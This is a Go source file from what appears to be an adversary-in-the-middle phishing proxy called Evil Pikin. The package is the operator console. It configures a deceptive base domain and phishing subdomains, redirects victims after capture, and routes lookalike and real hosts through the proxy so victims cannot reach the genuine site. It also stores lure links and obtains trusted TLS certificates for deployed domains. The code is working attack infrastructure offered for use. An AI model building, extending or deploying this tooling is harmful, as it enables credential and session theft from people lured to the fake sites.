// Package console implements the Evil Pikin control plane: the interactive
// terminal interface (REPL or embedded SSH) that operators use to drive the
// proxy engine.
//
// Architecture
// ------------
// The proxy engine (internal/proxy) runs as background goroutines bound to
// external ports. The console holds a thread-safe handle to that engine and
// issues start/stop/config commands against it. Because the engine lives in
// its own goroutines and the console is just another I/O loop, an operator
// disconnecting their SSH session (or detaching a tmux pane) leaves the
// engine running uninterrupted.
package console

import (
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/user/evilpikin/internal/config"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/pki"
	"github.com/user/evilpikin/internal/proxy"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/tui"
	"github.com/user/evilpikin/pkg/lures"
)

// Config holds global, operator-tunable control-plane parameters for the
// data-plane bind addresses and the dev certificate authority. Domain state
// (base domain, redirect, subdomains) lives in ProxyConfig.
type Config struct {
	ListenHTTP  string // data-plane plaintext listener, e.g. ":9080"
	ListenHTTPS string // data-plane TLS listener, e.g. ":9443"
	DevIP       string // IP that /etc/hosts entries should point at (dev DNS)
	CACertPath  string // dev root CA certificate (PEM)
	CAKeyPath   string // dev root CA private key (PEM)
}

// ProxyConfig is the deployment-domain state. It is guarded by an RWMutex so
// the interactive shell (and future remote clients) can mutate it safely
// while the proxy engine reads it from background goroutines. This is the
// "configuration engine" the operator drives over SSH.
type ProxyConfig struct {
	mu               sync.RWMutex
	BaseDomain       string   // e.g. "login-verification-secure.com"
	RedirectURL      string   // where to send the victim after capture
	ActiveSubdomains []string // e.g. ["login", "account", "api"]
	// SubdomainTargets binds each active subdomain to a target module ID, so
	// "<subdomain>.<BaseDomain>" is auto-registered into the engine as a host.
	SubdomainTargets map[string]string
	// TLSMode selects the certificate source: "dev" (install-once CA, for lab
	// / fake domains) or "acme" (Let's Encrypt, for real deployed domains).
	TLSMode string
	// DefaultTargetID is the target module used to dynamically serve the base
	// domain and any unregistered subdomain of it (no per-host listing needed).
	DefaultTargetID string
	// IPOverride lets the operator pin the server's public IP (IPv4 or IPv6)
	// instead of relying on auto-detection. Stored as a validated net.IP string.
	IPOverride string
}

// SetIP records a manually configured public IP. It accepts any string that
// net.ParseIP recognizes (IPv4 or IPv6) so the tool is dual-stack compatible
// and will not reject a valid v6 address.
func (p *ProxyConfig) SetIP(ip string) error {
	if net.ParseIP(ip) == nil {
		return fmt.Errorf("invalid IP address %q (use IPv4 or IPv6)", ip)
	}
	p.mu.Lock()
	defer p.mu.Unlock()
	p.IPOverride = ip
	return nil
}

// EffectivePublicIP returns the IP to display and use for DNS/redirect checks.
// If the operator pinned one it is returned as "Manual"; otherwise it is
// auto-detected and tagged "Auto-Detected". The version ("IPv4"/"IPv6") is
// derived from the parsed address.
func (p *ProxyConfig) EffectivePublicIP() (addr, version, source string) {
	p.mu.RLock()
	override := p.IPOverride
	p.mu.RUnlock()
	if override != "" {
		return override, IPVersion(net.ParseIP(override)), "Manual"
	}
	ip, ver, err := DetectPublicIP()
	if err != nil {
		return "", "", "Auto-Detected (failed)"
	}
	return ip.String(), ver, "Auto-Detected"
}

// SetDefaultTarget sets the target module used for dynamic subdomain proxying.
func (p *ProxyConfig) SetDefaultTarget(id string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.DefaultTargetID = id
}

// DefaultTarget returns the dynamic default target module ID.
func (p *ProxyConfig) DefaultTarget() (string, bool) {
	p.mu.RLock()
	defer p.mu.RUnlock()
	return p.DefaultTargetID, p.DefaultTargetID != ""
}

// SetTLSMode selects the TLS certificate strategy.
func (p *ProxyConfig) SetTLSMode(m string) error {
	if m != "dev" && m != "acme" {
		return fmt.Errorf("tls mode must be 'dev' or 'acme'")
	}
	p.mu.Lock()
	defer p.mu.Unlock()
	p.TLSMode = m
	return nil
}

// TLSMode returns the chosen TLS strategy (defaults to "dev").
func (p *ProxyConfig) GetTLSMode() string {
	p.mu.RLock()
	defer p.mu.RUnlock()
	if p.TLSMode == "" {
		return "dev"
	}
	return p.TLSMode
}

func (p *ProxyConfig) SetDomain(d string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.BaseDomain = d
}

func (p *ProxyConfig) SetRedirect(r string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.RedirectURL = r
}

func (p *ProxyConfig) AddSubdomain(s string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, x := range p.ActiveSubdomains {
		if x == s {
			return
		}
	}
	p.ActiveSubdomains = append(p.ActiveSubdomains, s)
}

// BindSubdomain records that subdomain s routes to target module targetID.
func (p *ProxyConfig) BindSubdomain(s, targetID string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, x := range p.ActiveSubdomains {
		if x == s {
			break
		}
	}
	// ensure membership in ActiveSubdomains
	found := false
	for _, x := range p.ActiveSubdomains {
		if x == s {
			found = true
		}
	}
	if !found {
		p.ActiveSubdomains = append(p.ActiveSubdomains, s)
	}
	if p.SubdomainTargets == nil {
		p.SubdomainTargets = map[string]string{}
	}
	p.SubdomainTargets[s] = targetID
}

func (p *ProxyConfig) RemoveSubdomain(s string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	out := p.ActiveSubdomains[:0]
	for _, x := range p.ActiveSubdomains {
		if x != s {
			out = append(out, x)
		}
	}
	p.ActiveSubdomains = out
	delete(p.SubdomainTargets, s)
}

// SubdomainTarget returns the target module ID bound to a subdomain.
func (p *ProxyConfig) SubdomainTarget(s string) (string, bool) {
	p.mu.RLock()
	defer p.mu.RUnlock()
	id, ok := p.SubdomainTargets[s]
	return id, ok
}

// FullHost renders the fully-qualified host for a subdomain.
func (p *ProxyConfig) FullHost(s string) string {
	p.mu.RLock()
	base := p.BaseDomain
	p.mu.RUnlock()
	if base == "" {
		return s
	}
	return s + "." + base
}

// Snapshot returns a consistent copy of the domain state.
func (p *ProxyConfig) Snapshot() (string, string, []string) {
	p.mu.RLock()
	defer p.mu.RUnlock()
	subs := make([]string, len(p.ActiveSubdomains))
	copy(subs, p.ActiveSubdomains)
	return p.BaseDomain, p.RedirectURL, subs
}

// Console is the shared, mutex-guarded state bridged between the control
// interface and the running proxy engine.
type Console struct {
	store    *storage.Store
	engine   *proxy.Engine
	ca       *pki.CA
	domain   *ProxyConfig
	mu       sync.Mutex
	listener *proxy.PublicListener

	cfg Config

	// Lures is the shared tracking-matrix registry. Both the control commands
	// (lures create/list/...) and the live proxy engine read/write the same
	// instance, so generated lures are enforced immediately.
	Lures *lures.Registry

	// dnsStatus is a human-readable indicator for the TUI (e.g. "out of sync",
	// "live (TTL 60s)", "error: <reason>"). Guarded by mu.
	dnsStatus string
}

// SetDNSStatus records the last DNS sync outcome for display in `config show`.
func (c *Console) SetDNSStatus(s string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.dnsStatus = s
}

// DNSStatus returns the last DNS sync outcome.
func (c *Console) DNSStatus() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.dnsStatus == "" {
		return "out of sync"
	}
	return c.dnsStatus
}

// Status returns a read-only snapshot used by the TUI status bar. It implements
// the tui.Backend interface so console.Console can drive the terminal UI without
// creating an import cycle (tui depends only on this interface, not on console).
func (c *Console) Status() tui.StatusInfo {
	domain, _, _ := c.domain.Snapshot()
	ip, ver, src := c.domain.EffectivePublicIP()
	return tui.StatusInfo{
		Domain:    domain,
		IP:        ip,
		IPVersion: ver,
		IPSource:  src,
		DNS:       c.DNSStatus(),
	}
}

// New builds a Console. The CA is loaded (or generated once) so leaf certs
// can be minted for every proxied SNI.
func New(store *storage.Store, engine *proxy.Engine, cfg Config) (*Console, error) {
	ca, err := pki.LoadOrGenerate(cfg.CACertPath, cfg.CAKeyPath)
	if err != nil {
		return nil, fmt.Errorf("load dev CA: %w", err)
	}
	if cfg.DevIP == "" {
		cfg.DevIP = "127.0.0.1"
	}
	c := &Console{store: store, engine: engine, ca: ca, domain: &ProxyConfig{TLSMode: "dev"}, cfg: cfg}
	// Tracking-matrix registry: shared by the control commands and the live
	// proxy engine so generated lures are enforced on the next request.
	c.Lures = lures.NewRegistry()
	// Persist lures to the database so they survive restarts (the in-memory map
	// alone is wiped on every process start, which previously left stale lure
	// URLs pointing at 404s on the origin).
	if store != nil {
		c.Lures.SetPersistence(store)
		if existing, err := store.ListLures(); err == nil {
			c.Lures.LoadLures(existing)
		}
	}
	engine.SetLures(c.Lures)
	// Dynamic host handling: any host the operator has configured (base-domain
	// subdomain, a target's proxy_host, or any related_domain) is derived on the
	// fly — no need to pre-list every phishing host.
	engine.SetDefaultTargetResolver(c.resolveHost)
	// Load optional AI configuration. When absent or disabled, the engine keeps
	// the pure-Go StaticTransformer; the AI layer is a future optimization and is
	// never on the request critical path.
	if aiCfg, err := config.LoadAIConfig("ai.json"); err == nil {
		engine.SetAIConfig(aiCfg)
		if aiCfg.Enabled {
			log.Info("ai.json enables AI, but the AI transformer is not wired yet; using static fallback (safe)")
		}
	}
	return c, nil
}

// resolveHost dynamically builds a target for an incoming SNI when it isn't
// already registered in the engine:
//   - the base domain or any "*.BaseDomain" proxies to the default target module;
//   - a target's phishing host (from its proxy_hosts) proxies to that target;
//   - a target's original host (an orig host in its chain that wasn't rewritten)
//     proxies to that target with the matching real origin, so the browser can
//     never escape the proxy to the real site.
func (c *Console) resolveHost(sni string) (*storage.TargetProfile, bool) {
	base, _, _ := c.domain.Snapshot()
	if base != "" && (sni == base || strings.HasSuffix(sni, "."+base)) {
		tid, ok := c.domain.DefaultTarget()
		if !ok {
			return nil, false
		}
		t, err := c.Store().GetTarget(tid)
		if err != nil {
			return nil, false
		}
		// Use the default target's primary origin so the landing renders.
		if rs := t.ResolvedProxyHosts(base); len(rs) > 0 {
			dt := deriveTarget(t, sni)
			dt.Origin = rs[0].OrigHost
			return dt, true
		}
		return deriveTarget(t, sni), true
	}
	targets, err := c.Store().ListTargets()
	if err != nil {
		return nil, false
	}
	for _, t := range targets {
		if !t.Enabled {
			continue
		}
		for _, r := range t.ResolvedProxyHosts(base) {
			switch sni {
			case r.PhishHost, r.OrigHost:
				dt := deriveTarget(t, sni)
				dt.Origin = r.OrigHost
				return dt, true
			}
		}
	}
	return nil, false
}

// Domain returns the deployment-domain configuration state.
func (c *Console) Domain() *ProxyConfig { return c.domain }

// BindSubdomain registers "<name>.<BaseDomain>" as a proxy host that serves
// the given target module. The derived profile is persisted to the store and
// upserted into the live engine so the SNI router serves it immediately.
func (c *Console) BindSubdomain(name, targetID string) (string, error) {
	base, _, _ := c.domain.Snapshot()
	if base == "" {
		return "", fmt.Errorf("set base domain first (config domain <your-domain>)")
	}
	t, err := c.Store().GetTarget(targetID)
	if err != nil {
		return "", fmt.Errorf("target %q not found: %w", targetID, err)
	}
	host := c.domain.FullHost(name)
	derived := deriveTarget(t, host)
	if err := c.Store().UpsertTarget(derived); err != nil {
		return "", err
	}
	c.Engine().UpsertTarget(derived)
	c.domain.BindSubdomain(name, targetID)
	return host, nil
}

// UnbindSubdomain removes a subdomain binding and its derived engine host.
func (c *Console) UnbindSubdomain(name string) (string, error) {
	host := c.domain.FullHost(name)
	c.domain.RemoveSubdomain(name)
	c.Engine().RemoveTarget(host)
	if t, err := c.Store().GetTarget("sub-" + host); err == nil {
		c.Store().DeleteTarget(t.ID)
	}
	return host, nil
}

// deriveTarget clones a base target profile scoped to a specific proxy host.
func deriveTarget(t *storage.TargetProfile, host string) *storage.TargetProfile {
	d := *t
	d.ID = "sub-" + host
	d.ProxyHost = host
	d.Enabled = true
	return &d
}

// CA returns the dev CA so the shell can print/export it for installation.
func (c *Console) CA() *pki.CA { return c.ca }

// Config returns a copy of the current global configuration.
func (c *Console) Config() Config {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.cfg
}

// SetConfig updates a single configuration key and returns an error for
// unknown keys. Unknown keys are rejected so typos fail loudly.
func (c *Console) SetConfig(key, value string) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	switch key {
	case "listen-http":
		c.cfg.ListenHTTP = value
	case "listen-https":
		c.cfg.ListenHTTPS = value
	case "dev-ip":
		c.cfg.DevIP = value
	default:
		return fmt.Errorf("unknown config key %q (try: listen-http, listen-https, dev-ip)", key)
	}
	return nil
}

// StartDataPlane brings up the background proxy listeners. It is safe to call
// only when the engine is stopped. The returned string is the human-readable
// status line for the operator.
//
// Certificate strategy:
//   - If a BaseDomain is configured we use an embedded ACME client
//     (Let's Encrypt, TLS-ALPN-01) for hands-free, real-domain HTTPS.
//   - Otherwise we fall back to the dev CA so lab hosts get trusted leaf certs
	//     after the operator installs .sandbox/certs/dev-ca.pem once.
func (c *Console) StartDataPlane() (string, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.listener != nil {
		return "", fmt.Errorf("data plane already running")
	}
	var resolver proxy.CertResolver
	base, _, subs := c.domain.Snapshot()
	if base != "" && c.domain.GetTLSMode() == "acme" {
		domains := []string{base}
		for _, s := range subs {
			domains = append(domains, c.domain.FullHost(s))
		}
		resolver = pki.NewACMEResolver(domains, ".sandbox/certs")
		log.Info("data plane: using ACME (Let's Encrypt) for %v", domains)
	} else {
		resolver = pki.NewResolver(c.ca)
		log.Info("data plane: using dev CA (install %s in the trust store)", c.cfg.CACertPath)
	}
	c.listener = proxy.NewPublicListener(c.engine, resolver, c.cfg.ListenHTTP, c.cfg.ListenHTTPS)
	if err := c.listener.Start(); err != nil {
		c.listener = nil
		return "", err
	}
	return fmt.Sprintf("[*] data plane started: http=%s https=%s", c.cfg.ListenHTTP, c.cfg.ListenHTTPS), nil
}

// StopDataPlane tears down the background proxy listeners.
func (c *Console) StopDataPlane() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.listener != nil {
		c.listener.Shutdown()
		c.listener = nil
	}
	return "[*] data plane stopped"
}

// IsRunning reports whether the background data plane is active.
func (c *Console) IsRunning() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.listener != nil
}

// Store exposes the persistence layer to command handlers.
func (c *Console) Store() *storage.Store { return c.store }

// Engine exposes the proxy engine to command handlers.
func (c *Console) Engine() *proxy.Engine { return c.engine }

// defaultConfig returns the out-of-the-box control-plane configuration.
func defaultConfig() Config {
	return Config{
		ListenHTTP:  "127.0.0.1:9080",
		ListenHTTPS: "127.0.0.1:9443",
		DevIP:       "127.0.0.1",
		CACertPath:  ".sandbox/certs/dev-ca.pem",
		CAKeyPath:   ".sandbox/certs/dev-ca.key",
	}
}
